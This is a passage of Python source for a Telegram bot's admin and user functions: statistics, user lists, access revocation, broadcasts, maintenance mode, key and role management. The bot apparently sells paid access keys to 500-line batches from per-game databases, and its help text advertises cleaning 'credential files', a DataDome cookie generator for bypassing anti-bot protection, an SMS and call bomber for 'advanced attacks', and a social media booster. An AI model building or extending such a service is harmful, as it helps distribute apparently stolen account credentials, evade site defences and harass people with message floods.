        save_access()

        asyncio.create_task(delete_generated_file(result_filepath))

        await start(update, context, edit_message_id=query.message.message_id)
        
        logging.info(f"User {user_id} generated {lines_to_generate} lines from {game}. Remaining: {len(remaining_lines)}")

    except Exception as e:
        logging.error(f"Error in generate_file: {e}")
        await current_message.edit_text(
            f"❌ **Generation Failed!**\n\nAn unexpected error occurred. Please try again later.",
            parse_mode="Markdown"
        )

# ========== STATISTICS FUNCTIONS ==========
async def show_stats(update: Update, context: CallbackContext):
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("show_stats called with no effective message.")
        return

    user_id = update.effective_user.id
    user = update.effective_user
    
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        if update.callback_query:
            await update.callback_query.answer("🛠️ Bot is under maintenance!", show_alert=True)
            await current_message.edit_text(
                "🛠️ **The Bot Is Maintenance**\n\n"
                "ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ ᴜɴᴅᴇʀɢᴏɪɴɢ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ!",
                parse_mode="Markdown"
            )
        else:
            await current_message.reply_text(
                "🛠️ **The Bot Is Maintenance**\n\n"
                "ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ ᴜɴᴅᴇʀɢᴏɪɴɢ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɴɢᴀɪɴ ʟᴀᴛᴇʀ!",
                parse_mode="Markdown"
            )
        return

    user_stats = USER_STATS.get(user_id, {"generations": 0})
    access_info = USER_ACCESS.get(user_id)
    
    if user_id == ADMIN_ID:
        access_status = "**👑 Administrator**"
        expires_text = "♾️ Permanent"
        access_emoji = "👑"
    elif access_info is None and user_id in USER_ACCESS:
        access_status = "**✞ Lifetime Premium**"
        expires_text = "♾️ Never expires"
        access_emoji = "🌟"
    elif access_info and access_info > datetime.datetime.now().timestamp():
        remaining_time = access_info - datetime.datetime.now().timestamp()
        days = int(remaining_time // 86400)
        hours = int((remaining_time % 86400) // 3600)
        access_status = f"**✅ Active Premium**"
        expires_text = f"🗓️ {days}d {hours}h remaining"
        access_emoji = "✅"
    else:
        access_status = "**❌ No Access**"
        expires_text = "🚫 Expired or inactive"
        access_emoji = "❌"
    
    db_stats, total_lines = get_database_stats()
    
    stats_text = (
        f"{access_emoji} **{user.first_name}'s Personal Statistics** {access_emoji}\n\n"
        f"👤 *Your Profile:*\n"
        f"• User ID: `{user_id}`\n"
        f"• Username: @{user.username or 'N/A'}\n"
        f"• Your Role: **{USER_ROLES.get(user_id, 'user').capitalize()}**\n\n"
        f"🔐 *Access Details:*\n"
        f"• Status: {access_status}\n"
        f"• Expires: {expires_text}\n\n"
        f"📊 *Your Usage:*\n"
        f"• Total Generations: **{user_stats.get('generations', 0)}**\n"
        f"• Last Active: *{user_stats.get('last_active', 'Never')[:10] if user_stats.get('last_active') else 'Never'}*\n\n"
        f"🗄️ *Overall Database Info:*\n"
        f"• Total Lines Available (Bot-wide): **{total_lines:,}**\n"
        f"• Lines per Generation: **500**\n"
    )

    if update.callback_query:
        await update.callback_query.message.edit_text(stats_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]]), parse_mode="Markdown")
    else:
        await update.message.reply_text(stats_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]]), parse_mode="Markdown")

async def database_status(update: Update, context: CallbackContext):
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("database_status called with no effective message.")
        return

    user_id = update.effective_user.id
    if not is_at_least_role(user_id, "owner"):
        if update.callback_query:
            await update.callback_query.answer("❌ Access Denied!", show_alert=True)
            await current_message.edit_text("❌ **Access Denied!** This command is for the owner only.", parse_mode="Markdown")
        else:
            await current_message.reply_text("❌ **Access Denied!** This command is for the owner only.", parse_mode="Markdown")
        return
        
    db_stats, total_lines = get_database_stats()
    
    status_text = "💾 **ᴇɴʜᴀɴᴄᴇ ᴅᴀᴛᴀʙᴀsᴇ sᴛᴀᴛᴜs ʀᴇᴘᴏʀᴛ** 📊\n\n"
    
    for db_name, count in db_stats.items():
        status = "🟢 ʜᴇᴀʟᴛʜʏ" if count > 1000 else "🟡 ᴍᴏᴅᴇʀᴀᴛᴇ" if count > 100 else "🔴 ʟᴏᴡ" if count > 0 else "⚫ ᴇᴍᴘᴛʏ"
        status_text += f"• {status}: **{db_name}** ({count:,} lines)\n"
        
        file_path = DATABASE_FILES[db_name]
        try:
            file_size = os.path.getsize(file_path) if os.path.exists(file_path) else 0
            size_mb = file_size / (1024 * 1024)
            status_text += f"  - *Lines*: **{count:,}**\n"
            status_text += f"  - *Size*: **{size_mb:.2f} MB**\n\n"
        except Exception as e:
            status_text += f"⚠️ **{db_name}** - Error reading file info: {e}\n\n"

    status_text += f"✨ *Overall Summary:*\n"
    status_text += f"• Total Lines Across All Databases: **{total_lines:,}**\n"
    status_text += f"• Databases with Content: **{len([x for x in db_stats.values() if x > 0])}/{len(DATABASE_FILES)}**\n"
    status_text += f"• Estimated Total Generations Possible (at 500 lines/gen): **{total_lines // 500:,}**\n"
    
    keyboard = [[InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", callback_data="show_admin_panel")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await current_message.edit_text(status_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(status_text, reply_markup=reply_markup, parse_mode="Markdown")

# ========== USER MANAGEMENT FUNCTIONS ==========
async def user_list(update: Update, context: CallbackContext):
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("user_list called with no effective message.")
        return

    user_id = update.effective_user.id
    if not is_at_least_role(user_id, "owner"):
        if update.callback_query:
            await update.callback_query.answer("❌ Access Denied!", show_alert=True)
            await current_message.edit_text("❌ **Access Denied!** This command is for the owner only.", parse_mode="Markdown")
        else:
            await current_message.reply_text("❌ **Access Denied!** This command is for the owner only.", parse_mode="Markdown")
        return
    
    if not USER_ACCESS:
        message_text = "📋 **No users found in the system.**"
    else:
        user_text = "👥 **User List Overview** 👥\n\n"
        active_count = 0
        
        for user_id_in_list, access_info in USER_ACCESS.items():
            current_role = USER_ROLES.get(user_id_in_list, "user")
            status_emoji = ""
            if current_role == "owner":
                status = "👑 ᴏᴡɴᴇʀ"
                status_emoji = "👑"
            elif current_role == "reseller":
                status = "💼 ʀᴇsᴇʟʟᴇʀ"
                status_emoji = "💼"
            else:
                if access_info is None:
                    status = "✞ ʟɪғᴇᴛɪᴍᴇ"
                    status_emoji = "✞"
                elif access_info and access_info > datetime.datetime.now().timestamp():
                    remaining = access_info - datetime.datetime.now().timestamp()
                    days = int(remaining // 86400)
                    status = f"✅ Active ({days}d left)"
                    status_emoji = "✅"
                else:
                    status = "❌ Expired"
                    status_emoji = "❌"
            
            generations = USER_STATS.get(user_id_in_list, {}).get("generations", 0)
            
            user_text += f"🆔 **User ID**: `{user_id_in_list}` {status_emoji}\n"
            user_text += f"  *Role*: **{status}**\n"
            user_text += f"  *Generations*: **{generations}**\n\n"

            if access_info is None or (access_info and access_info > datetime.datetime.now().timestamp()):
                active_count += 1
        
        user_text += f"📊 *Summary*: **{active_count}** active users out of **{len(USER_ACCESS)}** total."
        message_text = user_text
    
    keyboard = [[InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", callback_data="show_admin_panel")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await current_message.edit_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def revoke_access(update: Update, context: CallbackContext):
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("revoke_access called with no effective message.")
        return

    user_id = update.effective_user.id
    if not is_at_least_role(user_id, "owner"):
        if update.callback_query:
            await update.callback_query.answer("❌ Access Denied!", show_alert=True)
            await current_message.edit_text("❌ **Access Denied!** This command is for the owner only.", parse_mode="Markdown")
        else:
            await current_message.reply_text("❌ **Access Denied!** This command is for the owner only.", parse_mode="Markdown")
        return
    
    AWAITING_REVOKE_USER.add(user_id)
    message_text = (
        "🔴 **Revoke User Access** 🔴\n\n"
        "Please send the *User ID* of the person whose access you wish to revoke.\n"
        "✨ *Example*: `123456789` (numbers only).\n\n"
        "⚠️ *Note*: You cannot revoke administrator access through this function."
    )
    keyboard = [[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await current_message.edit_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def handle_revoke_user(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in AWAITING_REVOKE_USER:
        return
    
    try:
        user_id_to_revoke = int(update.message.text.strip())
        
        if user_id_to_revoke == ADMIN_ID:
            await update.message.reply_text("❌ **Operation Failed!** You cannot revoke administrator access.", parse_mode="Markdown")
        elif user_id_to_revoke in USER_ACCESS:
            del USER_ACCESS[user_id_to_revoke]
            USER_ROLES[user_id_to_revoke] = "user"
            save_access()
            await update.message.reply_text(f"✅ **Success!** Access for user `{user_id_to_revoke}` has been revoked. Their role has been reset to 'user'.", parse_mode="Markdown")
            logging.info(f"Admin revoked access for user {user_id_to_revoke}")
        else:
            await update.message.reply_text(f"❌ **User Not Found!** User `{user_id_to_revoke}` is not in the access list.", parse_mode="Markdown")
    except ValueError:
        await update.message.reply_text("❌ **Invalid Input!!** Please send a valid User ID (numbers only).", parse_mode="Markdown")
    
    AWAITING_REVOKE_USER.discard(user_id)
    await admin_panel(update, context)

async def send_announcement(update: Update, context: CallbackContext):
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("send_announcement called with no effective message.")
        return

    user_id = update.effective_user.id
    if not is_at_least_role(user_id, "owner"):
        if update.callback_query:
            await update.callback_query.answer("❌ Access Denied!", show_alert=True)
            await current_message.edit_text("❌ **Access Denied!** This command is for the owner only.", parse_mode="Markdown")
        else:
            await current_message.reply_text("❌ **Access Denied!** This command is for the owner only.", parse_mode="Markdown")
        return
    
    AWAITING_ANNOUNCEMENT.add(user_id)
    message_text = (
        "📣 **Broadcast Announcement** 📣\n\n"
        "Please send the message you wish to broadcast to *all* bot users (including those with expired access).\n\n"
        "✨ *Keep it concise for best readability!*"
    )
    keyboard = [[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await current_message.edit_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def handle_announcement(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in AWAITING_ANNOUNCEMENT:
        return
    
    announcement = update.message.text
    sent_count = 0
    failed_count = 0
    
    progress_msg = await update.message.reply_text("📡 **ʙʀᴏᴀᴅᴄᴀsᴛɪɴɢ ᴀɴɴᴏᴜɴᴄᴇᴍᴇɴᴛ...** ᴛʜɪs ᴍᴀʏ ᴛᴀᴋᴇ ᴀ ᴍᴏᴍᴇɴᴛ.", parse_mode="Markdown")
    
    for user_id_to_send in USER_ACCESS.keys():
        try:
            await context.bot.send_message(
                chat_id=int(user_id_to_send),
                text=f"**📢 ᴏғғɪᴄɪᴀʟ ᴀɴɴᴏᴜɴᴄᴇᴍᴇɴᴛ**\n\n{announcement}\n\n— *{BOT_DISPLAY_NAME}*",
                parse_mode="Markdown"
            )
            sent_count += 1
            await asyncio.sleep(0.1)
        except Exception as e:
            failed_count += 1
            logging.debug(f"Failed to send announcement to {user_id_to_send}: {e}")
    
    await progress_msg.edit_text(
        f"✅ **Announcement Sent!** ✅\n\n"
        f"• Successfully delivered to: **{sent_count} users**\n"
        f"• Failed to deliver to: **{failed_count} users**\n"
        f"• Total users processed: **{len(USER_ACCESS)}**",
        parse_mode="Markdown"
    )
    
    AWAITING_ANNOUNCEMENT.discard(user_id)
    await admin_panel(update, context)

# ========== HELP FUNCTION ==========
async def show_help(update: Update, context: CallbackContext):
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("show_help called with no effective message.")
        return

    user_id = update.effective_user.id
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        if update.callback_query:
            await current_message.answer("🛠️ Bot is under maintenance!", show_alert=True)
            await current_message.edit_text(
                "🛠️ **The Bot Is Maintenance**\n\n"
                "ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ ᴜɴᴅᴇʀɢᴏɪɴɢ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ!",
                parse_mode="Markdown"
            )
        else:
            await current_message.reply_text(
                "🛠️ **The Bot Is Maintenance**\n\n"
                "ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ ᴜɴᴅᴇʀɢᴏɪɴɢ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɴɢᴀɪɴ ʟᴀᴛᴇʀ!",
                parse_mode="Markdown"
            )
        return

    help_text = (
        "— **ʜᴇʟᴘ ᴀɴᴅ ɪɴғᴏʀᴍᴀᴛɪᴏɴ** —\n\n"
        "• *ʜᴏᴡ ᴛᴏ ᴜsᴇ ᴛʜᴇ ɢᴇɴᴇʀᴀᴛᴏʀ:*\n"
        "➢ ᴏʙᴛᴀɪɴ ʏᴏᴜʀ ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ᴋᴇʏ ғʀᴏᴍ **@Khatelynnnnnn**.\n"
        "➣ ᴛᴀᴘ ᴛʜᴇ '♨️ ᴜsᴇ ᴀᴄᴄᴇss ᴋᴇʏ' ʙᴜᴛᴛᴏɴ ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss.\n"
        "➢ ᴏɴᴄᴇ ᴀᴄᴛɪᴠᴀᴛᴇᴅ, ʏᴏᴜ ᴄᴀɴ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ᴘʀᴇᴍɪᴜᴍ ғɪʟᴇs ᴜsɪɴɢ ᴛʜᴇ '📂 ɢᴇɴᴇʀᴀᴛᴇ ғɪʟᴇs' ᴏᴘᴛɪᴏɴ.\n"
        "➣ ᴇxᴘʟᴏʀᴇ ᴛʜᴇ '🔐 ᴘʏᴛʜᴏɴ ᴇɴᴄʀʏᴘᴛᴏʀ' ᴛᴏ ᴘʀᴏᴛᴇᴄᴛ ʏᴏᴜʀ ᴘʏᴛʜᴏɴ sᴏᴜʀᴄᴇ.\n"
        "➣ ᴜsᴇ ᴛʜᴇ '🛠️ URL & Duplicate Remover' ᴛᴏ ᴄʟᴇᴀɴ ᴜᴘ ᴄʀᴇᴅᴇɴᴛɪᴀʟ ғɪʟᴇs.\n"
        "➣ ᴜsᴇ ᴛʜᴇ '🛡️ DataDome Generator' ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ғʀᴇsʜ ᴅᴀᴛᴀᴅᴏᴍᴇ ᴄᴏᴏᴋɪᴇs.\n"
        "➣ ᴜsᴇ ᴛʜᴇ '💣 SMS & Call Bomber' ғᴏʀ ᴀᴅᴠᴀɴᴄᴇᴅ sᴍs ᴀɴᴅ ᴄᴀʟʟ ʙᴏᴍʙɪɴɢ.\n"
        "➣ ᴜsᴇ ᴛʜᴇ '🚀 Social Media Booster' ғᴏʀ ʙᴏᴏsᴛɪɴɢ ᴛɪᴋᴛᴏᴋ, ᴛᴇʟᴇɢʀᴀᴍ, ғᴀᴄᴇʙᴏᴏᴋ, ɪɴsᴛᴀɢʀᴀᴍ, ᴛᴡɪᴛᴛᴇʀ, ʏᴏᴜᴛᴜʙᴇ.\n\n"
        "— *ᴘʀᴇᴍɪᴜᴍ ᴋᴇʏ ғᴇᴀᴛᴜʀᴇs:* —\n"
        "➣ ɢᴇɴᴇʀᴀᴛᴇs **500 ʟɪɴᴇs** ᴘᴇʀ ʀᴇǫᴜᴇsᴛs.\n"
        "➢ ɢᴇɴᴇʀᴀᴛᴇᴅ ʟɪɴᴇs ᴀʀᴇ **ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ ᴅᴀᴛᴀʙᴀsᴇ ᴀғᴛᴇʀ ᴅᴇʟɪᴠᴇʀʏ.\n"
        "➣ ᴀᴄᴄᴇss ʏᴏᴜʀ **ᴘᴇʀsᴏɴᴀʟ ᴜsᴀɢᴇ sᴛᴀᴛɪsᴛɪᴄs** ᴀᴛ ᴀɴʏ ᴛɪᴍᴇ.\n"
        "➣ ɢᴇɴᴇʀᴀᴛᴇᴅ ғɪʟᴇs ᴀʀᴇ **ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ ᴅᴇʟᴇᴛᴇᴅ ᴀғᴛᴇʀ 5 ᴍɪɴᴜᴛᴇs** ғᴏʀ ʏᴏᴜʀ sᴇᴄᴜʀɪᴛʏ.\n"
        "➢ ᴘʏᴛʜᴏɴ ᴇɴᴄʀʏᴘᴛɪᴏɴ ᴡɪᴛʜ **ᴍᴜʟᴛɪᴘʟᴇ ᴍᴇᴛʜᴏᴅs ᴀɴᴅ ʟᴀʏᴇʀs** ᴏғ ᴇɴᴄᴏᴇɪɴɢ.\n"
        "➢ ᴜʀʟ & ᴅᴜᴘʟɪᴄᴀᴛᴇ ʀᴇᴍᴏᴠᴇʀ ғᴏʀ **ᴄʟᴇᴀɴɪɴɢ ᴄʀᴇᴅᴇɴᴛɪᴀʟ ғɪʟᴇs**.\n"
        "➢ ᴅᴀᴛᴀᴅᴏᴍᴇ ɢᴇɴᴇʀᴀᴛᴏʀ ғᴏʀ **ʙʏᴘᴀssɪɴɢ ᴀɴᴛɪ-ʙᴏᴛ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ**.\n"
        "➢ sᴍs & ᴄᴀʟʟ ʙᴏᴍʙᴇʀ ᴡɪᴛʜ **13 ᴅɪғғᴇʀᴇɴᴛ sᴇʀᴠɪᴄᴇs** ғᴏʀ ᴀᴅᴠᴀɴᴄᴇᴅ ᴀᴛᴛᴀᴄᴋs.\n"
        "➢ sᴏᴄɪᴀʟ ᴍᴇᴅɪᴀ ʙᴏᴏsᴛᴇʀ ᴡɪᴛʜ **8 ᴅɪғғᴇʀᴇɴᴛ ᴘʟᴀᴛғᴏʀᴍs** ғᴏʀ ʙᴏᴏsᴛɪɴɢ.\n\n"
        "⌫ ғᴏʀ ᴀɴʏ ғᴜʀᴛʜᴇʀ sᴜᴘᴘᴏʀᴛ ᴏʀ ɪɴǫᴜɪʀɪᴇs, ᴘʟᴇᴀsᴇ ᴄᴏɴᴛᴀᴄᴛ ᴛʜᴇ ᴀᴅᴍɪɴɪsᴛʀᴀᴛᴏʀ **@Khatelynnnnnn**."
    )
    keyboard = [[InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await current_message.edit_text(help_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(help_text, reply_markup=reply_markup, parse_mode="Markdown")

# ========== BACK TO MAIN MENU ==========
async def back_to_main_menu(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    AWAITING_KEY_INPUT.discard(user_id)
    AWAITING_REVOKE_USER.discard(user_id)
    AWAITING_ANNOUNCEMENT.discard(user_id)
    AWAITING_KEY_DURATION.discard(user_id)
    AWAITING_DELETE_KEY.discard(user_id)
    AWAITING_KEY_COUNT.discard(user_id)
    AWAITING_ROLE_USER_ID.discard(user_id)
    AWAITING_ROLE_SELECTION.pop(user_id, None)
    AWAITING_FEEDBACK.discard(user_id)
    AWAITING_FILE_UPLOAD.discard(user_id)
    AWAITING_BOMBER_PHONE.discard(user_id)
    AWAITING_BOMBER_AMOUNT.discard(user_id)
    AWAITING_BOMBER_SENDER.discard(user_id)
    AWAITING_BOMBER_MESSAGE.discard(user_id)
    AWAITING_BOOST_URL.discard(user_id)
    BOOSTER_ACTIVE.discard(user_id)
    
    context.user_data.pop('enc_method', None)
    context.user_data.pop('enc_count', None)
    context.user_data.pop('keys_to_generate_count', None)
    context.user_data.pop('enc_page', None)
    context.user_data.pop('remover_option', None)
    context.user_data.pop('datadome_cookie', None)
    context.user_data.pop('bomber_phone', None)
    context.user_data.pop('bomber_amount', None)
    context.user_data.pop('bomber_sender', None)
    context.user_data.pop('bomber_message', None)
    context.user_data.pop('boost_type', None)
    
    if update.callback_query:
        await update.callback_query.answer("Returning to main menu...", show_alert=False)
        await start(update, context, edit_message_id=update.callback_query.message.message_id)
    else:
        await start(update, context)

# ========== MAINTENANCE FUNCTIONS ==========
async def show_maintenance_options(update: Update, context: CallbackContext):
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("show_maintenance_options called with no effective message.")
        return

    user_id = update.effective_user.id
    if not is_at_least_role(user_id, "owner"):
        if update.callback_query:
            await current_message.answer("❌ Access Denied!", show_alert=True)
            await current_message.edit_text("❌ **Access Denied!** This command is for the owner only.", parse_mode="Markdown")
        else:
            await current_message.reply_text("❌ **Access Denied!** This command is for the owner only.", parse_mode="Markdown")
        return

    current_status = "**✅ ON**" if MAINTENANCE_MODE else "**❌ OFF**"
    message_text = f"🛠️ **Maintenance Mode Control** 🛠️\n\n" \
                   f"*Current Status*: {current_status}\n\n" \
                   "Please select an action:"
    
    keyboard = [
        [InlineKeyboardButton("✅ ᴛᴜʀɴ ᴏɴ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ", callback_data="admin_turn_on_maintenance")],
        [InlineKeyboardButton("❌ ᴛᴜʀɴ ᴏғғ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ", callback_data="admin_turn_off_maintenance")],
        [InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", callback_data="show_admin_panel")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await current_message.edit_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def admin_turn_on_maintenance(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not is_at_least_role(user_id, "owner"):
        await update.callback_query.answer("❌ Access Denied!", show_alert=True)
        return
    
    global MAINTENANCE_MODE
    if not MAINTENANCE_MODE:
        MAINTENANCE_MODE = True
        await update.callback_query.answer("Maintenance Mode is now ON", show_alert=True)
        if update.callback_query:
            await update.callback_query.message.edit_text(
                "🛠️ **Maintenance Mode is now: ON** ✅\n\n"
                "Most bot features are now disabled for regular users. Only admin commands remain active. Remember to turn it OFF when done!",
                parse_mode="Markdown"
            )
        elif update.message:
            await update.message.reply_text(
                "🛠️ **Maintenance Mode is now: ON** ✅\n\n"
                "Most bot features are now disabled for regular users. Only admin commands remain active. Remember to turn it OFF when done!",
                parse_mode="Markdown"
            )
    else:
        await update.callback_query.answer("Maintenance Mode is already ON", show_alert=True)
    
    await admin_panel(update, context)

async def admin_turn_off_maintenance(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not is_at_least_role(user_id, "owner"):
        await update.callback_query.answer("❌ Access Denied!", show_alert=True)
        return
    
    global MAINTENANCE_MODE
    if MAINTENANCE_MODE:
        MAINTENANCE_MODE = False
        await update.callback_query.answer("Maintenance Mode is now OFF", show_alert=True)
        if update.callback_query:
            await update.callback_query.message.edit_text(
                "🛠️ **Maintenance Mode is now: OFF** ❌\n\n"
                "The bot is now fully operational for all users! Get back to generating!",
                parse_mode="Markdown"
            )
        elif update.message:
            await update.message.reply_text(
                "🛠️ **Maintenance Mode is now: OFF** ❌\n\n"
                "The bot is now fully operational for all users! Get back to generating!",
                parse_mode="Markdown"
            )
    else:
        await update.callback_query.answer("Maintenance Mode is already OFF", show_alert=True)
    
    await admin_panel(update, context)

# ========== DELETE KEY FUNCTION ==========
async def prompt_delete_single_key(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message if update.callback_query else update.message
    if not current_message:
        logging.warning("prompt_delete_single_key called with no effective message.")
        return

    user_id = update.effective_user.id
    if not is_at_least_role(user_id, "owner"):
        if update.callback_query:
            await current_message.answer("❌ Access Denied!", show_alert=True)
            await current_message.edit_text("❌ **Access Denied!** This command is for the owner only.", parse_mode="Markdown")
        else:
            await current_message.reply_text("❌ **Access Denied!** This command is for the owner only.", parse_mode="Markdown")
        return

    AWAITING_DELETE_KEY.add(user_id)
    message_text = (
        "🗑️ **Delete Single Access Key** 🗑️\n\n"
        "Please send the *exact* key you wish to remove from the system.\n"
        "This will delete it from both active and used key lists.\n\n"
        "*Example*: `ᑭᖇEᗰIᑌᗰ-123456`"
    )
    keyboard = [[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await current_message.edit_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    else:
        await current_message.reply_text(
            message_text,
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )

async def handle_delete_key(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in AWAITING_DELETE_KEY:
        return

    key_to_delete = update.message.text.strip()

    if key_to_delete in ACCESS_KEYS:
        del ACCESS_KEYS[key_to_delete]
        save_access()
        await update.message.reply_text(f"✅ **Key Deleted!**\n\nKey `{key_to_delete}` has been successfully removed from active keys.", parse_mode="Markdown")
        logging.info(f"Admin {user_id} deleted key: {key_to_delete} from available keys.")
    elif key_to_delete in USED_KEYS:
        USED_KEYS.discard(key_to_delete)
        save_access()
        await update.message.reply_text(f"✅ **Used Key Removed!**\n\nKey `{key_to_delete}` has been successfully removed from the used keys list.", parse_mode="Markdown")
        logging.info(f"Admin {user_id} removed used key: {key_to_delete}.")
    else:
        await update.message.reply_text(f"❌ **Key Not Found!**\n\nKey `{key_to_delete}` was not found in either active or used keys. Please check for typos.", parse_mode="Markdown")
    
    AWAITING_DELETE_KEY.discard(user_id)
    await admin_panel(update, context)

# ========== ROLE MANAGEMENT FUNCTIONS ==========
async def admin_manage_roles(update: Update, context: CallbackContext):
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("admin_manage_roles called with no effective message.")
        return

    user_id = update.effective_user.id
    if not is_at_least_role(user_id, "owner"):
        if update.callback_query:
            await update.callback_query.answer("❌ Access Denied!", show_alert=True)
            await current_message.edit_text("❌ **Access Denied!** This command is for the owner only.", parse_mode="Markdown")
        else:
            await current_message.reply_text("❌ **Access Denied!** This command is for the owner only.", parse_mode="Markdown")
        return

    message_text = "👥 **ᴍᴀɴᴀɢᴇ ʀᴏʟᴇs** 👥\n\nsᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ:"
    keyboard = [
        [InlineKeyboardButton("📝 ᴀssɪɢɴ/ᴄʜᴀɴɢᴇ ᴜsᴇʀ ʀᴏʟᴇ", callback_data="admin_prompt_role_user_id")],
        [InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", callback_data="show_admin_panel")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await current_message.edit_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def admin_prompt_role_user_id(update: Update, context: CallbackContext):
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("admin_prompt_role_user_id called with no effective message.")
        return

    user_id = update.effective_user.id
    if not is_at_least_role(user_id, "owner"):
        if update.callback_query:
            await update.callback_query.answer("❌ Access Denied!", show_alert=True)
            await current_message.edit_text("❌ **Access Denied!** This command is for the owner only.", parse_mode="Markdown")
        else:
            await current_message.reply_text("❌ **Access Denied!** This command is for the owner only.", parse_mode="Markdown")
        return

    AWAITING_ROLE_USER_ID.add(user_id)
    message_text = (
        "📝 **Assign/Change User Role** 📝\n\n"
        "Please send the *User ID* (numbers only) of the user whose role you want to manage.\n"
        "*Example*: `123456789` (numbers only).\n\n"
        "⚠️ *Note*: You cannot change your own role through this menu."
    )
    keyboard = [[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
